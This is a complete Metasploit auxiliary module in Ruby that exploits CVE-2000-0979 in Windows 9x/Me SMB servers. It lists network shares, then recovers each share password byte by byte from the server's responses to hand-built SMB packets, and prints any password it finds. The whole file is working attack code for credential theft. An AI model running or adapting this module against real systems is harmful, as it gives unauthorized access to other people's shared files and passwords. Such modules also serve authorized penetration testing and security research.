class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2000-0979 SMB Share Password Enumerator',
        'Description' => %q{
          This module exploits CVE-2000-0979, an information disclosure vulnerability
          in the share-level password authentication of Microsoft Windows 9x/Me SMB
          servers. The server validates passwords one character at a time, allowing an
          attacker to enumerate the correct password byte-by-byte based on the server
          response. A zero-length password is always accepted, and each subsequent
          character can be brute-forced individually, significantly reducing the search
          space required to recover the full share password.
        },
        'Author' => [
          'Zoltan Balazs <zoltan1.balazs@gmail.com> @zh4ck',
          'Azbil SecurityFriday Co Ltd'
        ],
        'References' => [
          ['CVE', '2000-0979'],
          ['URL', 'http://www.securityfriday.com/tools/SPC.html'],
        ],
        'DisclosureDate' => '2000-10-10',
        'License' => MSF_LICENSE,
        'Notes' => {
          'AKA' => ['Share Password Checker'],
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptInt.new('DELAY', [false, 'Add delay between password probes', 0]),
        OptPort.new('RPORT', [true, 'Set a port', 139])
      ]
    )
  end

  def send_recv_once(data)
    buf = ''
    begin
      sock.put(data.pack('C*'))
      buf = sock.get_once || ''
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end
    buf
  end

  def update_tid(packet, tid)
    tid_arr = tid.unpack('C*')
    packet.map! do |val|
      if val == 'tid0'
        tid_arr[0]
      elsif val == 'tid1'
        tid_arr[1]
      else
        val
      end
    end
    packet
  end

  def update_password(packet, params)
    new_packet = packet.map do |val|
      case val
      when 'length0' then params[:length0]
      when 'length1' then params[:length1]
      when 'byte_count0' then params[:byte_count0]
      when 'byte_count1' then params[:byte_count1]
      when 'nbs_length' then params[:nbs_length]
      else val
      end
    end

    share_chars = params[:share].chars.map(&:ord)

    new_packet.insert(new_packet.find_index('share'), share_chars).flatten!
    new_packet.delete_at(new_packet.find_index('share'))

    new_packet.insert(new_packet.find_index('password'), params[:password]).flatten!
    new_packet.delete_at(new_packet.find_index('password'))

    new_packet
  end

  def update_machine_name(packet, machine_name)
    packet.insert(packet.find_index('machine_name'), machine_name).flatten!
    packet.delete_at(packet.find_index('machine_name'))
    packet
  end

  def run
    delay = datastore['DELAY']
    print_status 'Starting CVE-2000-0979 SMB Share Password Enumerator'
    connect

    tree_disconnect_request = [
      0x00, 0x00, 0x00, 0x23, 0xff, 0x53, 0x4d, 0x42,
      0x71, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0xc8, 0xff, 0xfe,
      0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x00
    ]

    machine_name = 32.times.map { Random.rand(65..70) }

    session_request_def = [
      0x81, 0x00, 0x00, 0x44, 0x20, 0x45, 0x45, 0x45,
      0x46, 0x45, 0x47, 0x45, 0x42, 0x46, 0x46, 0x45,
      0x4d, 0x46, 0x45, 0x43, 0x41, 0x43, 0x41, 0x43,
      0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43,
      0x41, 0x43, 0x41, 0x43, 0x41, 0x00, 0x20, 'machine_name', 0x00
    ]

    session_request_def = update_machine_name(session_request_def, machine_name)

    neg_prot_req = [
      0x00, 0x00, 0x00, 0x2f, 0xff, 0x53, 0x4d, 0x42,
      0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x53, 0xc8,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x02, 0x4e, 0x54,
      0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32,
      0x00
    ]

    sess_setup_andx_req = [
      0x00, 0x00, 0x00, 0x9d, 0xff, 0x53, 0x4d, 0x42,
      0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xfe,
      0x00, 0x00, 0x04, 0x00, 0x0d, 0x75, 0x00, 0x74,
      0x00, 0x68, 0x0b, 0x02, 0x00, 0x00, 0x00, 0x09,
      0x06, 0x03, 0x80, 0x01, 0x00, 0x01, 0x00, 0x00,
      0x00, 0x00, 0x00, 0xd4, 0x00, 0x00, 0x00, 0x37,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x69, 0x6e,
      0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 0x30, 0x30,
      0x30, 0x20, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63,
      0x65, 0x20, 0x50, 0x61, 0x63, 0x6b, 0x20, 0x33,
      0x20, 0x32, 0x36, 0x30, 0x30, 0x00, 0x57, 0x69,
      0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 0x30,
      0x30, 0x30, 0x20, 0x35, 0x2e, 0x31, 0x00, 0x00,
      0x04, 0xff, 0x00, 0x9d, 0x00, 0x08, 0x00, 0x01,
      0x00, 0x1e, 0x00, 0x00, 0x5c, 0x5c, 0x31, 0x39,
      0x32, 0x2e, 0x31, 0x36, 0x38, 0x2e, 0x31, 0x32,
      0x32, 0x2e, 0x31, 0x34, 0x31, 0x5c, 0x49, 0x50,
      0x43, 0x24, 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f,
      0x00
    ]

    netshareenum_request = [
      0x00, 0x00, 0x00, 0x63, 0xff, 0x53, 0x4d, 0x42,
      0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x07, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 'tid0', 'tid1', 0xff, 0xfe,
      0x00, 0x00, 0x14, 0x00, 0x0e, 0x13, 0x00, 0x00,
      0x00, 0x08, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,
      0x00, 0x88, 0x13, 0x00, 0x00, 0x00, 0x00, 0x13,
      0x00, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x24, 0x00, 0x5c, 0x50, 0x49, 0x50, 0x45,
      0x5c, 0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x72,
      0x4c, 0x65, 0x68, 0x00, 0x42, 0x31, 0x33, 0x42,
      0x57, 0x7a, 0x00, 0x01, 0x00, 0x00, 0x10
    ]

    sess_setup_andx_req_anon = [
      0x00, 0x00, 0x00, 0x60, 0xff, 0x53, 0x4d, 0x42,
      0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x0b,
      0x00, 0x00, 0x01, 0x00, 0x0a, 0xff, 0x00, 0x00,
      0x00, 0x68, 0x0b, 0x02, 0x00, 0x01, 0x00, 0x0a,
      0x06, 0x02, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x29, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00,
      0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20,
      0x32, 0x30, 0x30, 0x30, 0x20, 0x32, 0x31, 0x39,
      0x35, 0x00, 0x00, 0x57, 0x69, 0x6e, 0x64, 0x6f,
      0x77, 0x73, 0x20, 0x32, 0x30, 0x30, 0x30, 0x20,
      0x35, 0x2e, 0x30, 0x00
    ]

    tree_connect_request_path_password = [
      0x00, 0x00, 0x00, 'nbs_length', 0xff, 0x53, 0x4d, 0x42,
      0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x0b,
      0x00, 0x00, 0x01, 0x00, 0x04, 0xff, 0x00, 0x00,
      0x00, 0x00, 0x00,
      'length0', 'length1', 'byte_count0', 'byte_count1', 'password',
      'share', 0x00, 0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00
    ]

    tree_disconnect = [
      0x00, 0x00, 0x00, 0x23, 0xff, 0x53, 0x4d, 0x42,
      0x71, 0x00, 0x00, 0x00, 0x00, 0x18, 0x20, 0x01,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 'tid0', 'tid1', 0xc0, 0x0b,
      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00
    ]

    client_packets = [
      { 'tree_disconnect_request' => tree_disconnect_request },
      { 'close1' => 'close' },
      { 'session_request_def' => session_request_def },
      { 'neg_prot_req' => neg_prot_req },
      { 'sess_setup_andx_req' => sess_setup_andx_req },
      { 'netshareenum_request' => netshareenum_request },
      { 'close3' => 'close' },
      { 'session_request_2' => session_request_def },
      { 'neg_prot_req_2' => neg_prot_req },
      { 'sess_setup_andx_req_anon' => sess_setup_andx_req_anon }
    ]

    tid = nil
    shares = []
    failed = false

    client_packets.each do |val|
      if val[val.keys[0]].to_s == 'close' && sock
        disconnect
        vprint_status 'Reconnecting...'
        connect
        next
      elsif !sock
        vprint_status 'Opening socket...'
        connect
        next
      end

      if ['netshareenum_request'].include?(val.keys[0])
        if tid.nil? || !tid.is_a?(String)
          print_error "TID not set, cannot send #{val.keys[0]}. Skipping."
          next
        end
        packet = update_tid(val[val.keys[0]], tid)
      else
        packet = val[val.keys[0]]
      end

      vprint_status "Sending: #{val.keys[0]}"
      response = send_recv_once(packet)

      if val.keys[0] == 'sess_setup_andx_req'
        if response.nil? || response.length < 30
          print_error 'Invalid response to session setup request.'
          failed = true
          break
        end
        tid = response[28..29]
        vprint_status 'Got TID'
      end

      if (val.keys[0] == 'session_request_def') && (response[0].ord != 0x82)
        print_error 'Session response is not positive! Exiting.'
        failed = true
        break
      end

      if (val.keys[0] == 'neg_prot_req') && (response[9].ord != 0x0)
        print_error 'Error in negotiation! Exiting.'
        failed = true
        break
      end

      if val.keys[0] == 'netshareenum_request'
        num_of_shares = response[65..66].unpack('cc').first
        print_good "Number of shares: #{num_of_shares}"
        print_good 'Share names:'
        num_of_shares.times do |n|
          offset = (n * 20) + 68
          share_name = response[offset..offset + 15]
          shares.push(share_name)
          print_good "  #{share_name}"
        end
      end
    rescue IOError, SocketError, SystemCallError => e
      print_error e.message
      print_error e.backtrace.inspect
      failed = true
    end

    unless failed
      brute_force_shares(shares, tree_connect_request_path_password, tree_disconnect, delay)
    end

    disconnect
  end

  private

  def brute_force_shares(shares, tree_connect_template, tree_disconnect, delay)
    shares.each do |share|
      share = share.delete("\000")
      nbs_length = 0x33 + share.length
      length0 = 0x01
      length1 = 0x00
      byte_count0 = 0x08 + share.length
      byte_count1 = 0x00
      password = [0x20]

      print_status "Brute-forcing password for share: #{share}"

      loop do
        params = {
          nbs_length: nbs_length, length0: length0, length1: length1,
          byte_count0: byte_count0, byte_count1: byte_count1,
          password: password, share: share
        }
        packet = update_password(tree_connect_template, params)
        response = send_recv_once(packet)

        status_bytes = response[9..12].unpack('C4')
        if status_bytes[0] == 0
          if password[0] == 0x20 && password[1] == 0x20
            print_good "Empty password works for share: #{share}"
            break
          end

          confirmed = password.select { |v| v < 128 }.map(&:chr).join
          print_status "Share #{share} - confirmed so far: #{confirmed}"

          length0 += 1
          nbs_length += 1
          byte_count0 += 1
          password.push(0x20)

          tid = response[28..29] if response && response.length >= 30
          if tid && tid.is_a?(String)
            pkt = update_tid(tree_disconnect, tid)
            send_recv_once(pkt)
          end
        else
          password[length0 - 1] += 1

          vprint_status password.select { |v| v < 128 }.map(&:chr).join

          sleep(delay) if delay > 0
          sleep(0.01)

          if password[length0 - 1] > 128
            found = password.select { |v| v < 128 }.map(&:chr).join
            if length0 > 1
              print_good "Password found for share #{share}: #{found}"
            else
              print_status "Password not found for share: #{share}"
            end
            break
          end
        end
      rescue IOError, SocketError, SystemCallError => e
        print_error e.message
        print_error e.backtrace.inspect
        break
      end
    end
  end
end
